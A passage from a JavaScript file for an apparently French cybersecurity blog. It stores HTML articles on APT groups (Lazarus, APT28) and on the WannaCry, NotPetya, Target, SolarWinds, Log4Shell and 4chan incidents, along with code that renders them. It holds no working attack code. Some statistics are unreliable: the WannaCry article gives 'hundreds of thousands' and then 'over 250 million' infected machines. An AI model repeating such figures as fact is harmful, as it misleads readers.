     <br> <h2>3. Arsenal technique</h2> <ul> <li><strong>Malwares :</strong> Destover, WannaCry, FallChill, AppleJeus, Manuscrypt, Dtrack</li> <li><strong>Méthodes d’intrusion :</strong> Hameçonnage (phishing) très ciblé, spear phishing avec des fichiers malveillants Word/Excel, exploitation de vulnérabilités zero-day</li> <li><strong>Infrastructure :</strong> Réseaux de serveurs relais, DNS compromis, tunnels VPN chiffrés, infrastructures parfois partagées avec d’autres groupes nord-coréens</li> </ul> <h2>4. Victimologie</h2> <ul> <li><strong>Secteurs ciblés :</strong> Médias, finance (banques, crypto), défense, santé, cybersécurité</li> <li><strong>Géographie :</strong> Monde entier, avec des cibles en Corée du Sud, aux États-Unis, en Europe, en Asie du Sud-Est</li> <li><strong>Sélection :</strong> Organisations d’intérêt stratégique, entreprises riches ou politiquement sensibles</li> </ul> <h2>5. Particularités</h2> <ul> <li><strong>Actions hybrides :</strong> Mélange de sabotage, vol financier et espionnage pur</li> <li><strong>Évolution constante :</strong> Capacité d’adaptation technique et tactique très élevée</li> <li><strong>Faux profils :</strong> Utilisation de fausses identités LinkedIn, GitHub ou Discord pour approcher les victimes</li> </ul> <h2>6. Indicateurs de compromission (IoCs)</h2> <ul> <li><strong>Domaines malveillants :</strong> serveurs C2 déguisés en services légitimes (ex : Google Update, Microsoft Help)</li> <li><strong>Hashes malwares :</strong> Nombreux identifiants SHA256 publics pour AppleJeus, Dtrack, etc.</li> <li><strong>Comportements réseaux :</strong> Connexions sortantes vers serveurs .onion, tentatives de tunneling DNS</li> </ul> <h2>7. Contre-mesures</h2> <ul> <li><strong>Segmentation réseau :</strong> Limiter les mouvements latéraux en compartimentant les environnements critiques</li> <li><strong>Surveillance accrue :</strong> Logs réseau, détection comportementale (EDR), surveillance des accès sortants</li> <li><strong>Vérification des identités :</strong> Valider l’identité des contacts externes (notamment sur LinkedIn, GitHub)</li> <li><strong>Mise à jour régulière :</strong> Patch management rigoureux, notamment pour éviter les exploits de vulnérabilités connues</li> </ul>`, `hackers`];

const apt28 = [`Analyse du groupe APT28`, `cyber-apt28`, `        <h2>1. Identification du groupe</h2> <p><strong>Nom :</strong> APT28 (également connu sous les noms Fancy Bear, Sofacy, STRONTIUM)</p> <p><strong>Origine :</strong> Russie</p> <p><strong>Affiliations :</strong> Lié au renseignement militaire russe (GRU, Direction principale du renseignement)</p> <p><strong>Motivations :</strong> Politiques (cyberespionnage, influence politique), militaires (collecte d’informations sensibles), parfois économiques</p> <h2>2. Historique des opérations</h2> <ul> <li><strong>2007–2014 :</strong> Campagnes d’espionnage ciblant les gouvernements occidentaux, notamment en Europe de l’Est et aux États-Unis</li> <li><strong>2014 :</strong> Attaques massives contre des institutions politiques ukrainiennes lors du conflit en Ukraine</li> <li><strong>2016 :</strong> Ingérence dans les élections présidentielles américaines (phishing des comptes e-mails du Parti Démocrate)</li> <li><strong>2017 :</strong> Attaques contre des organisations de défense et des médias occidentaux, propagation de malwares sophistiqués</li> <li><strong>2018–2023 :</strong> Campagnes régulières de cyberespionnage sur des infrastructures critiques, secteurs militaires, diplomatiques, énergétiques</li> </ul> <img src="img/apt28.png" alt=""> <h2>2.5. Mise en relations avec d'autre groupe connue.</h2>     <img src="img/graph.png" alt="">
     <br> <h2>3. Arsenal technique</h2> <ul> <li><strong>Malwares :</strong> Sofacy, X-Agent, Zebrocy, Fancy Bear Downloader, CHOPSTICK</li> <li><strong>Méthodes d’intrusion :</strong> Phishing ciblé (spear phishing), exploitation de vulnérabilités zero-day, compromission de serveurs VPN et proxies</li> <li><strong>Infrastructure :</strong> Réseaux de serveurs C2 répartis mondialement, utilisation de domaines compromis et serveurs relais, faux sites légitimes</li> </ul> <h2>4. Victimologie</h2> <ul> <li><strong>Secteurs ciblés :</strong> Gouvernements, forces armées, organismes de sécurité, partis politiques, médias, industries stratégiques (énergie, défense)</li> <li><strong>Géographie :</strong> Principalement Europe, États-Unis, Ukraine, OTAN, mais aussi Moyen-Orient et Asie centrale</li> <li><strong>Sélection :</strong> Cibles à haute valeur stratégique, responsables politiques, chercheurs en sécurité, journalistes</li> </ul> <h2>5. Particularités</h2> <ul> <li><strong>Opérations de longue durée :</strong> Campagnes d’espionnage sur plusieurs années avec persistence élevée</li> <li><strong>Techniques d’obfuscation :</strong> Utilisation de multiples couches de chiffrement et d’outils pour masquer les communications</li> <li><strong>Utilisation mixte :</strong> Combinaison d’espionnage, de désinformation et d’ingérence politique</li> </ul> <h2>6. Indicateurs de compromission (IoCs)</h2> <ul> <li><strong>Domaines malveillants :</strong> Plusieurs domaines liés à des faux sites gouvernementaux ou liés à des infrastructures critiques</li> <li><strong>Hashes malwares :</strong> Identifiants SHA256 connus pour Sofacy, X-Agent, Zebrocy, disponibles dans les bases publiques</li> <li><strong>Comportements réseaux :</strong> Communications régulières vers des serveurs C2 basés sur des protocoles propriétaires, utilisation de tunnels HTTPS et DNS</li> </ul> <h2>7. Contre-mesures</h2> <ul> <li><strong>Formation des utilisateurs :</strong> Sensibilisation au phishing ciblé et aux faux liens</li> <li><strong>Surveillance réseau :</strong> Détection des communications anormales avec serveurs C2, analyse comportementale (EDR)</li> <li><strong>Mise à jour des systèmes :</strong> Patch rapide des vulnérabilités zero-day</li> <li><strong>Authentification forte :</strong> Utilisation de MFA pour l’accès aux systèmes critiques</li> <li><strong>Segmentation :</strong> Isolation des réseaux sensibles pour limiter les déplacements latéraux</li> </ul>`, `hackers`];

const Wannacry = [`WannaCry - Cyberattaque mondiale de 2017`, `wannacry`, ` <p>
    En mai 2017, le ransomware <strong>WannaCry</strong> a déclenché une vague d’attaques informatiques d’une ampleur sans précédent à l’échelle mondiale. Exploitant une vulnérabilité critique de Windows référencée <code>CVE-2017-0144</code>, WannaCry a rapidement infecté des centaines de milliers d’ordinateurs dans plus de 150 pays.
  </p>

  <h2>La faille EternalBlue et DoublePulsar</h2>
  <p>
    WannaCry s’appuie sur une faille de sécurité exploitée initialement par la NSA et divulguée par le groupe Shadow Brokers. Cette faille, appelée <em>EternalBlue</em>, cible le protocole SMB (Server Message Block) des systèmes Windows. En parallèle, l’exploit <em>DoublePulsar</em> est utilisé comme porte dérobée pour propager le ransomware.
  </p>

  <p>
    La vulnérabilité affectait principalement des versions de Windows non mises à jour ou plus supportées par Microsoft, notamment Windows XP, Windows 7 non patché, et Windows Server 2008. Microsoft a dû publier des correctifs exceptionnels pour ces systèmes en fin de vie, afin d’endiguer la propagation.
  </p>

  <h2>Mécanisme d’attaque et propagation</h2>
  <p>
    Une fois qu’un ordinateur est infecté, WannaCry chiffre immédiatement les fichiers personnels, rendant l’accès impossible sans la clé de déchiffrement. Une demande de rançon en Bitcoin est alors affichée, exigeant plusieurs centaines de dollars pour récupérer les données.
  </p>

  <p>
    Le ransomware se propage automatiquement vers d’autres machines sur le même réseau local ainsi que vers des ordinateurs accessibles via Internet, exploitant la même faille sans intervention de l’utilisateur. Cette capacité d’auto-propagation a permis à WannaCry d’infecter rapidement un nombre colossal de systèmes.
  </p>

  <h2>Impact et conséquences</h2>
  <ul>
    <li><strong>Nombre d’ordinateurs infectés :</strong> plus de 250 millions selon les estimations</li>
    <li><strong>Coût estimé des dommages :</strong> entre 100 millions et 1 milliard de dollars</li>
    <li><strong>Zones affectées :</strong> à l’échelle mondiale, impactant des hôpitaux, entreprises, administrations et particuliers</li>
    <li><strong>Gravité (CVSS) :</strong> 8.8/10</li>
  </ul>

  <h2>Leçons et prévention</h2>
  <p>
    WannaCry a souligné l’importance cruciale de maintenir à jour ses systèmes d’exploitation et de déployer rapidement les correctifs de sécurité. L’attaque a aussi révélé les risques liés à l’utilisation de systèmes obsolètes ou non supportés.
  </p>

  <p>
    Depuis, les organisations ont renforcé leurs stratégies de cybersécurité, notamment en adoptant des sauvegardes régulières, des solutions de détection et en sensibilisant leurs utilisateurs aux risques liés aux rançongiciels.
  </p>

  <h2>Réponse de Microsoft</h2>
  <p>
    Face à cette crise, Microsoft a exceptionnellement publié des patches pour des versions non supportées comme Windows XP, Windows 8 et Windows Server 2003, afin de limiter la propagation de WannaCry. Cette démarche rare montre l’urgence et la gravité de la situation.
  </p>

  <p>
    Malgré cela, de nombreuses machines non mises à jour restent vulnérables, rappelant la nécessité d’une vigilance constante face aux menaces cybernétiques.
  </p>`, `event`];

const notpetya = [`NotPetya – Cyberattaque dévastatrice de 2017`, `notpetya`, `<p>
    En 2017, <strong>NotPetya</strong> s’est imposé comme l’une des cyberattaques les plus destructrices jamais enregistrées. Utilisant la même faille critique <code>CVE-2017-0144</code> connue sous le nom d’<em>EternalBlue</em>, cette attaque a visé principalement les systèmes Windows, se propageant rapidement à travers les réseaux d’entreprise et provoquant des pertes massives de données.
  </p>

  <h2>Exploitation de la faille EternalBlue</h2>
  <p>
    NotPetya exploite la vulnérabilité EternalBlue, qui affecte le protocole SMB (Server Message Block) de Windows, permettant une propagation automatisée sans intervention humaine. Cette vulnérabilité, initialement révélée lors de la fuite d’outils de la NSA, est également la base de l’attaque WannaCry survenue la même année.
  </p>

  <h2>Mécanisme et impact de l’attaque</h2>
  <p>
    Contrairement à certains ransomwares classiques, NotPetya ne se contente pas de chiffrer les données. Il procède à une suppression quasi irréversible des fichiers, rendant leur récupération impossible. Toutefois, le malware affiche une fausse demande de rançon, suggérant que le paiement permettrait de restaurer les données, ce qui est en réalité une tromperie.
  </p>

  <p>
    La nature destructrice de NotPetya a causé des perturbations majeures dans plus de 200 entreprises à travers le monde, notamment dans des secteurs critiques tels que la logistique, la finance, et l’énergie.
  </p>

  <h2>Conséquences financières et géographiques</h2>
  <ul>
    <li><strong>Nombre d’entreprises impactées :</strong> plus de 200</li>
    <li><strong>Pertes financières estimées :</strong> supérieures à 10 milliards de dollars</li>
    <li><strong>Zone affectée :</strong> à l’échelle mondiale</li>
    <li><strong>Gravité (CVSS) :</strong> 8.8/10</li>
  </ul>

  <h2>Réponse de Microsoft</h2>
  <p>
    Pour contrer la propagation de NotPetya, Microsoft a publié des correctifs de sécurité pour la faille EternalBlue, invitant les utilisateurs à mettre à jour leurs systèmes pour se protéger efficacement contre cette menace.
  </p>

  <h2>Enseignements</h2>
  <p>
    NotPetya illustre à quel point les attaques informatiques peuvent être non seulement lucratives, mais aussi destructrices. Il rappelle l’importance d’une politique de sécurité rigoureuse incluant des mises à jour régulières, des sauvegardes fréquentes, et une sensibilisation accrue aux risques cybernétiques.
  </p>`, `event`];

const target = [`Target - Violation massive de données en 2013`, `target`, ` <p>
    En 2013, l'entreprise américaine <strong>Target</strong> a subi une violation de données majeure qui a compromis les informations sensibles de dizaines de millions de clients. Cette attaque sophistiquée combinait ingénierie sociale, vulnérabilités techniques et failles organisationnelles.
  </p>

  <h2>Technique d'attaque : Phishing et exploitation des accès tiers</h2>
  <p>
    Les attaquants ont d'abord ciblé <em>Fazio Mechanical Services</em>, un sous-traitant de Target, via une campagne de phishing par email. Une fois infectés par un malware, ils ont récupéré les identifiants d’accès à leur portail interne.
  </p>

  <p>
    Grâce à ces accès, ils ont pu se connecter au réseau interne de Target, où aucune restriction suffisante n'empêchait l’upload de fichiers exécutables. Un fichier contenant un script malveillant a ainsi été uploadé, permettant une prise de contrôle à distance du serveur.
  </p>

  <h2>Escalade des privilèges et compromission des systèmes de paiement</h2>
  <p>
    Le système de <em>single sign-on (SSO)</em> utilisé par Target pour ses comptes administrateurs a facilité l’attaque : la possession du hash du mot de passe suffisait à devenir administrateur. 
  </p>

  <p>
    Les attaquants ont ensuite déployé le malware <strong>Kaptoxa</strong> sur les terminaux de paiement (POS). Ce logiciel malveillant interceptait et enregistrait les données des cartes de crédit et de débit des clients lors des transactions, compromettant ainsi des millions d’informations bancaires.
  </p>

  <h2>Impact et conséquences</h2>
  <ul>
    <li><strong>Nombre de victimes :</strong> entre 40 et 70 millions de clients affectés</li>
    <li><strong>Pertes financières estimées :</strong> plus de 200 millions de dollars</li>
    <li><strong>Zone affectée :</strong> États-Unis, principalement au niveau national</li>
    <li><strong>Type de faille :</strong> combinaison de vulnérabilités humaines, techniques et organisationnelles</li>
  </ul>

  <h2>Réponse et prévention</h2>
  <p>
    À la suite de cette attaque, une sensibilisation accrue à l’utilisation des cartes à puce et du système PIN a été menée aux États-Unis. Les entreprises ont également renforcé leurs politiques de sécurité, notamment en améliorant la segmentation des réseaux et en limitant l’accès des tiers aux systèmes critiques.
  </p>

  <h2>Leçons tirées</h2>
  <p>
    L’attaque Target illustre parfaitement les risques liés à la chaîne d’approvisionnement et à la gestion des accès. La sécurité des systèmes dépend aussi bien de la technologie que des processus organisationnels et de la formation du personnel.
  </p>`, `event`];

const solarwinds = [`SolarWinds – Une attaque sophistiquée de la chaîne d'approvisionnement en 2020`, `solar-winds`, `<p>
    En 2020, l’entreprise SolarWinds a été victime d’une attaque majeure exploitant la chaîne d'approvisionnement via une vulnérabilité référencée <code>CVE-2020-10148</code>. Cette cyberattaque est considérée comme l’une des plus sophistiquées et étendues, affectant plus de 18 000 clients, dont plusieurs agences gouvernementales américaines.
  </p>

  <h2>Technique : Compromission d’une mise à jour logicielle</h2>
  <p>
    Les attaquants ont implanté un <em>cheval de Troie</em> dans une future mise à jour d’Orion, le logiciel de gestion réseau édité par SolarWinds. Lorsqu’une organisation installait cette mise à jour compromise, la backdoor était déployée, offrant un accès à distance non autorisé aux systèmes ciblés.
  </p>

  <h2>Impact et portée</h2>
  <ul>
    <li><strong>Clients impactés :</strong> environ 18 000, incluant des entreprises privées et des agences fédérales américaines</li>
    <li><strong>Pertes estimées :</strong> supérieures à 26 millions de dollars en coûts directs et indirects</li>
    <li><strong>Zone affectée :</strong> mondial, avec un focus sur les États-Unis</li>
    <li><strong>Criticité (CVSS) :</strong> 9.8/10</li>
  </ul>

  <h2>Conséquences pour la cybersécurité</h2>
  <p>
    Cette attaque a révélé la vulnérabilité critique des chaînes d’approvisionnement logicielles, démontrant que la sécurité ne se limite pas aux systèmes finaux, mais doit intégrer l’ensemble des étapes de développement, livraison et maintenance des logiciels.
  </p>

  <h2>Recommandations et bonnes pratiques</h2>
  <p>
    Pour se prémunir contre ce type de menace, il est essentiel de :
  </p>
  <ul>
    <li>Renforcer les contrôles d’accès aux systèmes de build et de déploiement</li>
    <li>Mettre en place des mécanismes rigoureux de contrôle d’intégrité des mises à jour logicielles (signatures numériques, vérifications d’intégrité)</li>
    <li>Surveiller en continu les comportements anormaux post-mise à jour</li>
    <li>Former les équipes sur les risques liés à la chaîne d’approvisionnement logicielle</li>
  </ul>

  <h2>Conclusion</h2>
  <p>
    L’attaque SolarWinds souligne l’importance cruciale de la sécurité au sein de la chaîne d’approvisionnement numérique, un vecteur d’attaque désormais privilégié par les acteurs malveillants pour pénétrer les infrastructures critiques.
  </p>`, `event`];

const logshell = [`Log4Shell – Vulnérabilité critique dans Apache Log4j en 2021`, `log-4-shell`, ` <p>
    En 2021, la vulnérabilité <strong>Log4Shell</strong>, référencée <code>CVE-2021-44228</code>, a provoqué l’une des plus grandes alertes de sécurité informatique de la décennie. Cette faille critique affecte la bibliothèque Java Apache Log4j, largement utilisée pour la gestion des logs dans les applications et services, en particulier dans les environnements cloud.
  </p>

  <h2>Nature de la vulnérabilité</h2>
  <p>
    Log4Shell est une injection de code Java qui permet à un attaquant d’exécuter du code arbitraire à distance (RCE – Remote Code Execution) sur le système vulnérable. Cette faille est exploitée via la journalisation d’une chaîne de caractères spécialement conçue, permettant d’injecter un payload malveillant.
  </p>

  <h2>Impact mondial</h2>
  <ul>
    <li><strong>Environnements affectés :</strong> 93% des environnements cloud et une majorité d’entreprises utilisant Apache Log4j</li>
    <li><strong>Coût estimé :</strong> environ 90 millions de dollars par entreprise victime</li>
    <li><strong>Criticité (CVSS) :</strong> 10/10 – score maximum</li>
    <li><strong>Zone affectée :</strong> Monde entier</li>
  </ul>

  <h2>Mesures correctives et mitigations</h2>
  <p>
    Suite à la découverte de Log4Shell, de multiples patchs temporaires ont été rapidement publiés. Il est fortement recommandé de :
  </p>
  <ul>
    <li>Mettre à jour immédiatement la bibliothèque Log4j vers une version corrigée</li>
    <li>Déployer des systèmes de détection d’intrusions (IDS/IPS) capables de repérer les tentatives d’exploitation</li>
    <li>Auditer les logs et surveiller les activités suspectes sur les systèmes utilisant Log4j</li>
    <li>Adopter des politiques de gestion des vulnérabilités et de mise à jour continue des composants tiers</li>
  </ul>

  <h2>Conclusion</h2>
  <p>
    Log4Shell a mis en lumière la fragilité des chaînes logicielles et la nécessité d’une vigilance accrue dans la gestion des dépendances logicielles. Cette vulnérabilité reste un exemple majeur des risques liés à la sécurité des composants open source dans les infrastructures critiques modernes.
  </p>`, `event`];

const CyberAtk = [`Cyberattaque contre 4chan : quand Soyjak.party frappe en 2025`, `4chan-soyjak`, `<header>
    <p>Le <strong>14 avril 2025</strong>, l’imageboard <strong>4chan</strong> a subi une vaste intrusion informatique revendiquée par « Soyjak.party », entraînant une fuite du code source PHP, des données administrateurs et des informations utilisateurs (<a href="https://www.scworld.com/brief/significant-cyberattack-hits-4chan?utm_source=chatgpt.com" target="_blank">scworld.com</a>).</p>
</header>
    <section>
      <h2>🔍 Mode opératoire : comment ont-ils fait ?</h2>
      <ul>
        <li><strong>Exploitation d’un PHP obsolète</strong> : version 5.x non patchée depuis 2016, vulnérable à l'exécution de code à distance.</li>
        <li><strong>Accès prolongé</strong> : infiltration pendant plus d’un an avant le lancement de « Operation Soyclipse ».</li>
        <li><strong>Accès shell & phpMyAdmin</strong> : contrôle complet du serveur et restauration de la board bannie <code>/qa/</code>.</li>
      </ul>
    </section>

    <section>
      <h2>📂 Fuite des données : que sait-on ?</h2>
      <ul>
        <li><strong>Code source PHP de 4chan</strong> publié sur divers forums (Kiwi Farms, GitHub Gists).</li>
        <li><strong>Emails & IP des modérateurs</strong> : risque de doxxing, y compris des adresses .edu et .gov.</li>
        <li><strong>Tableaux restaurés</strong> avec messages de prise de contrôle visible publiquement.</li>
      </ul>
    </section>

    <section>
      <h2>📈 Enjeux majeurs</h2>
      <h3>1. Sécurité technique</h3>
      <ul>
        <li>Utilisation de technologies obsolètes (PHP 5.x).</li>
        <li>Manque de mises à jour et d’audits réguliers.</li>
        <li>Monitoring et réaction lente.</li>
      </ul>
      <h3>2. Vie privée et anonymat</h3>
      <ul>
        <li>Risque de harcèlement et de doxxing.</li>
        <li>Violation de la promesse d’anonymat.</li>
        <li>Répercussions juridiques potentielles pour les admins.</li>
      </ul>
      <h3>3. Conflit entre communautés</h3>
      <ul>
        <li>Attaque symbolique dans la guerre des memes.</li>
        <li>Radicalisation des sous-communautés en ligne.</li>
        <li>Portée idéologique de l’attaque revendiquée.</li>
      </ul>
    </section>

    <section>
      <h2>⚠️ Conséquences et retombées</h2>
      <ul>
        <li><strong>Interruption de service</strong> : 4chan indisponible plusieurs jours, pages texte uniquement.</li>
        <li><strong>Crise de confiance</strong> : utilisateurs et modérateurs exposés, réputation ternie.</li>
        <li><strong>Effet domino</strong> : d'autres sites vont renforcer leur sécurité.</li>
      </ul>
    </section>

    <footer><section>
      <h2>🔚 Conclusion</h2>
      <p>La cyberattaque de Soyjak.party sur 4chan démontre que même les plateformes anonymes et marginales sont vulnérables lorsqu'elles négligent la cybersécurité.</p>
      <table>
        <thead>
          <tr>
            <th>Aspect</th>
            <th>Impact</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>Technique</td>
            <td>Exploitation PHP obsolète, accès shell, fuite code source</td>
          </tr>
          <tr>
            <td>Données</td>
            <td>Fuite d’emails, IP, risques de doxxing</td>
          </tr>
          <tr>
            <td>Communautaire</td>
            <td>Guerre entre boards, fracture idéologique</td>
          </tr>
        </tbody>
      </table>
    </section>

    <section>
      <h2>🔗 Sources principales</h2>
      <ul>
        <li><a href="https://www.bleepingcomputer.com/news/security/infamous-message-board-4chan-taken-down-following-major-hack/?utm_source=chatgpt.com" target="_blank">BleepingComputer</a></li>
        <li><a href="https://redact.dev/blog/4chan-hack-leak-2025/?utm_source=chatgpt.com" target="_blank">Redact.dev</a></li>
        <li><a href="https://www.scworld.com/brief/significant-cyberattack-hits-4chan?utm_source=chatgpt.com" target="_blank">SCWorld</a></li>
        <li><a href="https://www.404media.co/4chan-is-down-following-what-looks-to-be-a-major-hack-spurred-by-meme-war/?utm_source=chatgpt.com" target="_blank">404Media</a></li>
        <li><a href="https://hackread.com/4chan-breached-soyjak-forum-hacker-source-code-leak/?utm_source=chatgpt.com" target="_blank">HackRead</a></li>
        <li><a href="https://www.wired.com/story/2025-4chan-hack-admin-leak?utm_source=chatgpt.com" target="_blank">Wired</a></li>
      </ul>
    </section></footer>`, `event`];

const CyberEnjeuxSante = [`Cybersécurité dans la santé : Enjeux économiques, humains et stratégiques`, `cybersecurite-sante`, `<header>
      <p>À l’ère du numérique, le secteur de la santé est devenu une cible de choix pour les cybercriminels. Entre la numérisation des dossiers médicaux, la télémédecine, les objets connectés et les systèmes hospitaliers interconnectés, les risques liés à la cybersécurité explosent. Ces menaces ne sont pas seulement techniques : elles touchent profondément l'économie, les individus et les politiques de santé. Voici les <strong>grands enjeux</strong> de la cybersécurité dans la santé.</p>
    </header>

    <section>
      <h2>💰 1. Enjeux <em>économiques</em></h2>
      <p>Les attaques informatiques dans le domaine de la santé peuvent coûter <strong>des millions d’euros</strong>, non seulement en réparation mais aussi en perte d’exploitation ou en dédommagements.</p>
      <h3>Enjeux concrets :</h3>
      <ul>
        <li><strong>Coût des rançongiciels (ransomwares)</strong> : De nombreux hôpitaux, comme celui de Corbeil-Essonnes en 2022, ont été paralysés par des ransomwares. Les cybercriminels réclament des rançons pouvant atteindre plusieurs millions d’euros.</li>
        <li><strong>Interruption de service</strong> : Lors d'une attaque, un hôpital peut être contraint d'annuler des opérations ou de rediriger les patients, entraînant des pertes économiques importantes.</li>
        <li><strong>Investissements obligatoires en cybersécurité</strong> : Face aux menaces croissantes, les établissements doivent investir massivement dans des audits, des formations, des logiciels de protection et des systèmes de sauvegarde.</li>
      </ul>
    </section>

    <section>
      <h2>🧍‍♂️ 2. Enjeux <em>humains</em></h2>
      <p>La cybersécurité touche aussi à <strong>la vie et à la sécurité des patients</strong>. Les conséquences ne sont pas uniquement numériques : elles peuvent être vitales.</p>
      <h3>Enjeux concrets :</h3>
      <ul>
        <li><strong>Risque vital pour les patients</strong> : Une attaque peut retarder un diagnostic ou une intervention chirurgicale, ce qui peut entraîner des complications médicales graves, voire la mort.</li>
        <li><strong>Violation de la vie privée</strong> : Le vol de données médicales expose les patients à des discriminations (assurances, emploi, crédit), ou à des chantages.</li>
        <li><strong>Perte de confiance</strong> : Si les patients ne se sentent plus en sécurité, ils pourraient refuser le partage de données ou l’utilisation d’outils numériques, ralentissant les progrès médicaux.</li>
      </ul>
    </section>

    <section>
      <h2>🧭 3. Enjeux <em>stratégiques</em></h2>
      <p>La cybersécurité dans la santé est aussi une <strong>question de souveraineté et de résilience nationale</strong>. Les infrastructures de santé sont des cibles prioritaires en cas de cyberconflit.</p>
      <h3>Enjeux concrets :</h3>
      <ul>
        <li><strong>Espionnage et guerre numérique</strong> : Les États peuvent cibler les systèmes de santé pour collecter des données sensibles ou déstabiliser un pays en temps de crise (pandémie, guerre).</li>
        <li><strong>Dépendance technologique</strong> : Beaucoup de systèmes de santé utilisent des logiciels étrangers. En cas de coupure d’accès ou de conflit géopolitique, les services peuvent être affectés.</li>
        <li><strong>Planification des crises</strong> : Une cyberattaque lors d’une pandémie ou d’une catastrophe naturelle peut paralyser la gestion de crise. La cybersécurité devient donc une composante essentielle des politiques de santé publique.</li>
      </ul>
    </section>
    <iframe width="100%" height="432" src="https://miro.com/app/live-embed/uXjVIjetIKg=/?embedMode=view_only_without_ui&moveToViewport=-1161,-816,1806,896&embedId=614842929574" frameborder="0" scrolling="no" allow="fullscreen; clipboard-read; clipboard-write" allowfullscreen></iframe>
    <footer>
      <h2>🧠 Conclusion</h2>
      <p>La cybersécurité dans la santé n’est plus un simple sujet technique, mais un <strong>enjeu multidimensionnel</strong>. Protéger les données et les systèmes de santé, c’est protéger l’économie, la vie des citoyens et la stabilité d’un pays. Cela nécessite une <strong>mobilisation collective</strong> : professionnels de santé, décideurs politiques, experts en cybersécurité et citoyens doivent travailler ensemble pour construire un système de santé <strong>plus résilient, plus sûr, et plus humain</strong>.</p>
    </footer>`, `Autre`];



const articles = [ctwelve, cten, cnine, ceight, cseven, csix, cfive, cfour, cthree, ctwo, cone, lapsus, lazarus, apt28, target, Wannacry, notpetya, solarwinds, logshell, CyberEnjeuxSante, CyberAtk];




if (!window.location.href.includes('article')){
const ul = document.getElementById('list-articles');

// Regrouper les articles par tag
const articlesByTag = {};
articles.forEach(([title, slug, _, tag]) => {
  if (!articlesByTag[tag]) {
    articlesByTag[tag] = [];
  }
  articlesByTag[tag].push({ title, slug });
});

// Pour chaque tag, créer un sous-titre et les articles associés
for (const tag in articlesByTag) {
  // Titre du tag
  const tagTitle = document.createElement('h2');
  tagTitle.textContent = `📂 ${tag}`;
  ul.appendChild(tagTitle);

  // Liste des articles sous ce tag
  const tagUl = document.createElement('ul');
  tagUl.style.marginBottom = '30px';

  // Trier les articles par titre (ordre alphabétique)
  const sortedArticles = articlesByTag[tag].sort((a, b) => 
    a.title.localeCompare(b.title, 'fr', { sensitivity: 'base' })
  );

  // Créer les éléments de la liste
  sortedArticles.forEach(({ title, slug }) => {
    const li = document.createElement('li');
    const a = document.createElement('a');
    a.href = `article.html?slug=${slug}`;
    a.textContent = title;
    li.appendChild(a);
    tagUl.appendChild(li);
  });

  ul.appendChild(tagUl);
}


} else {
  const titre = document.getElementById("titre");
  const content = document.getElementById("content");
  const queryString = window.location.search;

  const urlParams = new URLSearchParams(queryString);
  const slug = urlParams.get('slug');

  // On cherche l'article correspondant au slug
  const article = articles.find(article => article[1] === slug);

  if (article) {
    titre.innerText = article[0];     // Titre de l'article
    content.innerHTML = article[2];   // Contenu HTML de l'article
  } else {
    // Si l'article n'existe pas
    titre.innerText = "Article introuvable";
    content.innerHTML = "<p>Désolé, cet article n'existe pas ou a été supprimé.</p>";
  }
}